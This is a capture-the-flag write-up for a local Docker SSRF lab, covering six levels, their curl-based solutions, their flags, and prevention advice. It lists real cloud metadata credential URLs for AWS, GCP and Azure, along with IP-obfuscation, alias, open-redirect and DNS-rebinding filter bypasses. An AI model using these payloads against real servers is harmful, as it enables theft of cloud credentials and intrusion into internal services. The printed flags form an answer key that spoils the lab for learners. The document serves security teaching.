# SSRF Lab - Server-Side Request Forgery CTF Writeup

## Table of Contents
1. [Introduction](#introduction)
2. [Lab Architecture](#lab-architecture)
3. [Lab Setup](#lab-setup)
4. [What is SSRF?](#what-is-ssrf)
5. [Challenge Levels](#challenge-levels)
6. [Solutions](#solutions)
7. [SSRF Exploitation Techniques](#ssrf-exploitation-techniques)
8. [Prevention](#prevention)

---

## Introduction

This lab teaches **Server-Side Request Forgery (SSRF)** - a vulnerability where the server makes HTTP requests to URLs provided by the attacker. Unlike LFI (Local File Inclusion) which reads local files, SSRF focuses on **forcing the server to make HTTP requests to internal services** that are not publicly accessible.

**Lab URL:** `http://YOUR_IP:8041/`

**Flag Format:** `IDS{32_character_hexadecimal}`

**Key Difference from LFI:** This lab uses **cURL with HTTP/HTTPS only** - no `file://`, `php://`, or `data://` protocols. The goal is to access **internal HTTP services**, not read local files.

---

## Lab Architecture

```
+-------------------+       Docker Network (172.28.0.0/16)
|                   |       +---------------------------+
|  User (Browser)   |       |                           |
|       |           |       |  +---------------------+  |
|       v           |       |  | ssrf-app            |  |
|  http://IP:8041 --+-------+->| 172.28.0.10:80      |  |
|                   |       |  | (Vulnerable App)    |  |
|                   |       |  +----------+----------+  |
|                   |       |             |              |
|                   |       |    SSRF Request (cURL)     |
|                   |       |             |              |
|                   |       |  +----------v----------+  |
|                   |       |  | internal-api        |  |
|                   |       |  | 172.28.0.50:80      |  |
|                   |       |  | NO EXTERNAL PORT    |  |
|                   |       |  | (Contains Flags)    |  |
|                   |       |  +---------------------+  |
|                   |       +---------------------------+
```

**Key point:** The `internal-api` service has **NO externally exposed port**. It can only be accessed from within the Docker network. The SSRF vulnerability allows you to reach it through the `ssrf-app`.

### Docker Network Aliases

The `internal-api` service has multiple hostnames:
- `internal-api` (primary hostname)
- `metadata.internal` (simulates cloud metadata)
- `db.internal` (simulates internal database service)
- IP: `172.28.0.50` (fixed IP address)

### Lab Structure
```
ssrf-lab-ctf/
├── app/
│   └── index.php              # Main vulnerable SSRF application (6 levels)
├── internal-api/
│   ├── Dockerfile             # Internal API service Dockerfile
│   └── src/
│       ├── index.php          # Internal API with flag endpoints
│       └── flags/             # Flag files
│           ├── flag1.txt - flag6.txt
├── flags/                     # Backup flags
├── Dockerfile                 # Main app Dockerfile
├── docker-compose.yml         # Docker Compose with both services
└── SSRF_LAB_WRITEUP.md        # This file
```

---

## Lab Setup

### Deployment

```bash
cd /home/devuser/documents/tools/ssrf-lab-ctf/
docker-compose up -d --build
```

Access the lab at `http://localhost:8041/`

### Verify Setup

```bash
# Check both containers are running
docker ps

# Verify internal-api is NOT accessible from host
curl http://172.28.0.50/flag1  # Should fail from host
curl http://localhost:8041/     # Should show the lab
```

---

## What is SSRF?

**Server-Side Request Forgery (SSRF)** is a vulnerability where an attacker can make the server perform HTTP requests to arbitrary destinations. This is different from LFI:

| Aspect | SSRF | LFI |
|--------|------|-----|
| What it does | Server makes HTTP requests | Server reads local files |
| Protocol | HTTP/HTTPS | file://, php:// |
| Target | Internal services, APIs | Local filesystem |
| Impact | Access internal APIs, metadata | Read sensitive files |
| This lab | Yes, uses cURL HTTP | No, file:// is blocked |

---

## Challenge Levels

### Level 1: Basic SSRF (Easy)
**Objective:** Access the internal API to retrieve the flag.

**Challenge:** No filtering. The server fetches any HTTP URL you provide.

**SSRF Concept:** The server can reach internal services that you cannot access directly.

**Flag:** `IDS{8b2c3d62408bfc2143b0f333b7058c59}`

---

### Level 2: SSRF Service Enumeration (Easy)
**Objective:** Discover hidden API endpoints on the internal service.

**Challenge:** The internal API has multiple endpoints. You need to find the one that contains credentials.

**SSRF Concept:** SSRF can be used to enumerate internal API endpoints and discover sensitive data.

**Flag:** `IDS{08dfeabb29c5d1a5f2d04223814fd4eb}`

---

### Level 3: SSRF Hostname Filter Bypass (Medium)
**Objective:** Bypass hostname-based filtering to access the internal admin dashboard.

**Challenge:** The hostname "internal-api" is blocked. But the service is still reachable via its IP address.

**Blocked:** `internal-api` (hostname only, not IP)

**SSRF Concept:** Hostname-based blocking is insufficient. Always check the resolved IP address.

**Flag:** `IDS{4bfa7103b22c8e342fd6e31f9940c3dc}`

---

### Level 4: SSRF Cloud Metadata Access (Medium)
**Objective:** Access simulated cloud instance metadata to steal IAM credentials.

**Challenge:** No filter, but you need to know the cloud metadata URL pattern. The internal API responds to "metadata.internal" hostname.

**SSRF Concept:** Cloud metadata endpoints (AWS: 169.254.169.254, GCP: metadata.google.internal) expose sensitive IAM credentials. SSRF is the primary attack vector.

**Flag:** `IDS{5e6c48659e67227be88627b49eab7c28}`

---

### Level 5: SSRF with IP + Hostname Blocking (Hard)
**Objective:** Bypass multiple hostname and IP filters to access the database config.

**Challenge:** The following are blocked: `internal-api`, `172.28.0.50`, `metadata.internal`. But the service has another hostname alias.

**Blocked:** `internal-api`, `172.28.0.50`, `metadata.internal`

**SSRF Concept:** Blacklists are never complete. Services may have multiple hostnames/aliases that the filter doesn't know about.

**Flag:** `IDS{421215baaadc30329134748981c96b5c}`

---

### Level 6: SSRF via Open Redirect Bypass (Hard)
**Objective:** Use the application's open redirect vulnerability to bypass all filters.

**Challenge:** ALL internal hostnames and IPs are blocked. But the application has an open redirect at `/redirect?dest=URL`. The filter only checks the initial URL's host, not the redirect destination.

**Blocked:** `internal-api`, `172.28.0.50`, `metadata.internal`, `db.internal`

**SSRF Concept:** Open redirects can bypass SSRF filters. The filter validates the initial URL but not where the redirect goes.

**Flag:** `IDS{cd0d3f73382e5f5a84c357e5d0aea0ee}`

---

## Solutions

### Level 1 Solution: Basic SSRF

The server fetches any URL. The internal API is at `http://internal-api`:

```
URL: http://internal-api/flag1
```

**Test:**
```bash
curl "http://localhost:8041/?level=1&url=http://internal-api/flag1"
```

**Response:**
```
=== Internal API Service ===
Status: ACTIVE
Service: Internal Data Repository

Flag: IDS{8b2c3d62408bfc2143b0f333b7058c59}
```

**What you learned:** The server can access internal services via their Docker hostname. These services are not exposed to the internet but are accessible from within the network.

---

### Level 2 Solution: SSRF Service Enumeration

The internal API has hidden endpoints. Try common paths:

```bash
# Enumerate endpoints
curl "http://localhost:8041/?level=2&url=http://internal-api/"
curl "http://localhost:8041/?level=2&url=http://internal-api/api/"
curl "http://localhost:8041/?level=2&url=http://internal-api/api/v1/"
curl "http://localhost:8041/?level=2&url=http://internal-api/api/v2/"
```

The flag is at the credentials endpoint:

```
URL: http://internal-api/api/v2/credentials
```

**Test:**
```bash
curl "http://localhost:8041/?level=2&url=http://internal-api/api/v2/credentials"
```

**Response:**
```json
{
    "service": "internal-auth-service",
    "version": "2.1.0",
    "status": "active",
    "credentials": {
        "api_key": "IDS{08dfeabb29c5d1a5f2d04223814fd4eb}",
        ...
    }
}
```

**What you learned:** SSRF can be used to enumerate internal API endpoints, just like you would enumerate a web application - but from the server's perspective inside the network.

---

### Level 3 Solution: Hostname Filter Bypass

The hostname `internal-api` is blocked. Use the IP address instead:

```
URL: http://172.28.0.50/admin/dashboard
```

**Test:**
```bash
curl "http://localhost:8041/?level=3&url=http://172.28.0.50/admin/dashboard"
```

**Response:**
```html
<h1>Internal Admin Dashboard</h1>
<p>Admin Token: IDS{4bfa7103b22c8e342fd6e31f9940c3dc}</p>
```

**What you learned:** Hostname-based blocking is trivially bypassed. A proper SSRF filter must resolve the hostname to an IP and check against a blocked IP list.

---

### Level 4 Solution: Cloud Metadata Access

Access the simulated cloud metadata endpoint. In real AWS, this would be `http://169.254.169.254/latest/meta-data/`. In this lab, it's simulated via the `metadata.internal` hostname:

```
URL: http://metadata.internal/latest/meta-data/
```

**Test:**
```bash
curl "http://localhost:8041/?level=4&url=http://metadata.internal/latest/meta-data/"
```

**Response:**
```
ami-id: ami-0abcdef1234567890
hostname: ip-172-28-0-50.ec2.internal
...
SecretAccessKey: IDS{5e6c48659e67227be88627b49eab7c28}
```

**What you learned:** Cloud metadata endpoints expose IAM credentials, instance info, and other secrets. SSRF is the primary way attackers steal cloud credentials.

**Real-world equivalents:**
```bash
# AWS Metadata
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

### Level 5 Solution: Alternative Hostname Bypass

The filter blocks `internal-api`, `172.28.0.50`, and `metadata.internal`. But the service has another alias: `db.internal`:

```
URL: http://db.internal/db/config
```

**Test:**
```bash
curl "http://localhost:8041/?level=5&url=http://db.internal/db/config"
```

**Response:**
```json
{
    "database": {
        "host": "mysql.internal",
        "port": 3306,
        "credentials": {
            "username": "root",
            "password": "IDS{421215baaadc30329134748981c96b5c}"
        }
    }
}
```

**What you learned:** Blacklist-based filtering is never complete. Services can have multiple hostnames, aliases, or VIPs that the filter doesn't know about. Use **whitelisting** instead.

---

### Level 6 Solution: Open Redirect Bypass

All internal hostnames and IPs are blocked. But this application has an **open redirect** vulnerability at `/redirect?dest=URL`. The SSRF filter only checks the **initial URL's host**, not where the redirect goes.

```
URL: http://localhost/redirect?dest=http://internal-api/vault/secret
```

**How it works:**
1. Filter checks: host is `localhost` - not in blocklist - ALLOWED
2. Server makes cURL request to `http://localhost/redirect?dest=http://internal-api/vault/secret`
3. The `/redirect` endpoint returns `302 Location: http://internal-api/vault/secret`
4. cURL follows the redirect to `http://internal-api/vault/secret` (CURLOPT_FOLLOWLOCATION is enabled)
5. Response from internal-api is returned

**Test:**
```bash
curl "http://localhost:8041/?level=6&url=http://localhost/redirect?dest=http://internal-api/vault/secret"
```

**Response:**
```
=== INTERNAL SECRET VAULT ===
Vault ID: vault-internal-001
Status: UNLOCKED
Master Key: IDS{cd0d3f73382e5f5a84c357e5d0aea0ee}
```

**What you learned:** SSRF filters must validate the **final destination** after all redirects, not just the initial URL. Disable redirect following or validate each redirect hop.

---

## SSRF Exploitation Techniques

### 1. Internal Service Access
```bash
# Access services not exposed to the internet
http://internal-api/
http://admin-panel.internal/
http://staging-api:8080/
```

### 2. Cloud Metadata Access
```bash
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 3. Hostname Bypass via IP
```bash
# Use IP instead of hostname
http://172.28.0.50/     instead of http://internal-api/
```

### 4. Open Redirect Bypass
```bash
# Use application's own redirect to bypass host filters
http://localhost/redirect?url=http://internal-api/
```

### 5. DNS Rebinding
```bash
# DNS resolves to allowed IP first, then to blocked IP
http://attacker-domain-that-rebinds.com/
```

### 6. IP Obfuscation
```
| Technique    | Example        | Equivalent    |
|--------------|----------------|---------------|
| Decimal      | 2886733362     | 172.28.0.50   |
| Hexadecimal  | 0xac1c0032     | 172.28.0.50   |
| Octal        | 02543400062    | 172.28.0.50   |
| IPv6         | ::ffff:ac1c:32 | 172.28.0.50   |
```

---

## Prevention

### 1. Whitelist (Not Blacklist)
```php
$allowed = ['api.example.com'];
$host = parse_url($url, PHP_URL_HOST);
if (!in_array($host, $allowed)) {
    die('Blocked');
}
```

### 2. Disable Redirect Following
```php
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
```

### 3. Validate Final Destination
```php
// After DNS resolution, check the actual IP
$ip = gethostbyname($host);
$blocked_ips = ['127.0.0.1', '169.254.169.254', '10.0.0.0/8', '172.16.0.0/12'];
if (ip_in_blocked_range($ip, $blocked_ips)) {
    die('Blocked');
}
```

### 4. Restrict Protocols
```php
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS); // HTTPS only
```

### 5. Network Segmentation
- Internal services should be on isolated networks
- Application servers should have minimal outbound access
- Block access to cloud metadata endpoints

### 6. Use IMDSv2 for Cloud
```bash
# AWS IMDSv2 requires a session token (PUT request first)
# This prevents simple SSRF from accessing metadata
```

---

## Learning Outcomes

After completing this lab, you should understand:

- How SSRF differs from LFI (HTTP requests vs file access)
- How to access internal services through SSRF
- How to enumerate internal API endpoints
- How to bypass hostname-based filters using IP addresses
- How cloud metadata can be exploited through SSRF
- Why blacklist-based filtering is insufficient
- How open redirects can bypass SSRF filters
- How to prevent SSRF in your applications

---

**Note:** This lab is for educational purposes only. Always obtain proper authorization before testing.
